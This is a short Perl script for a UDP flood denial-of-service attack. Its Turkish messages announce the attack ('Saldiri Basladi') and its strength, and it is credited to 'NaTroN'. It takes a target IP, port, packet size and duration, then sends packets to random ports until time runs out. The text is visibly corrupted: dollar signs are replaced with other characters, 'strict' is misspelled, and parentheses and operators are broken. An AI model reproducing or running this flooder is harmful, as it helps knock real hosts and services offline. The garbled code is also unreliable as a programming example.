* ! /usr/bin/perl
**
* ! /usr/bin/perl
use Socket ;
use striot ;
my (Şip,Sport,Şsize,Ştime) =@ARGV;
my (Şiaddr,Sendtime,Spsize,Spport) ;
Şiaddr=inet_aton ("Şip") or die "perl NaTroN.pl Ip Port MBE Software - PerlDos* Şip/n";
Şendtime=time () + (Ştime ? Ştime : 100) ;
socket (flood,PF_INET,SOCK_DGRAM, 17) ;


print
<<EOTEXT;
EOTEXT

print"~Saldiri Basladi Edit : ByNaTroN : Şip". (Sport?Sport:"random") ."SALDIRI GUCU ".
 (Şsize?"Şsize-Gbit" : "SmackedWith A Large Packets?") ."".
 (Ştime ?  "for Ştime Saniye " : "") ."/n";
for  (; time () <=Şendtime;) {
Spsize =Şsize ? Şsize : int (rand(1024-64) +64;
Spport -Sport ? Sport : int(rand(65500) ) +1;

send (flood,pack ("aŞpsize","flood") ,O,pack_sockaddr_in (Şpport,Şiaddr) ):) 